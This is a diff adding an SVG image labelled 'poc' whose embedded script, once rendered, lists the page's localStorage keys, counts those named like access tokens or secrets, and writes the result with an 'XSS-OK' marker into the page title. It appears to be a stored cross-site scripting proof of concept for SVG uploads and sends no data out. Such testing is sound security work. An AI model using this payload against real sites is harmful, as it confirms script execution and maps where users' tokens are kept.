@@ -1,0 +1,13 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="240" height="120">
+  <script><![CDATA[
+    (function () {
+      var ks = [];
+      try { for (var i = 0; i < localStorage.length; i++) { ks.push(localStorage.key(i)); } } catch (e) {}
+      var tok = ks.filter(function (k) { return /accesstoken|secret|token/i.test(k); }).length;
+      document.title = 'XSS-OK origin=' + location.origin + ' lskeys=' + ks.length + ' tokenkeys=' + tok;
+      document.documentElement.setAttribute('data-xss', '1');
+    })();
+  ]]></script>
+  <rect width="240" height="120" fill="#0a7"/>
+  <text x="14" y="66" fill="#fff" font-family="sans-serif" font-size="18">poc</text>
+</svg>
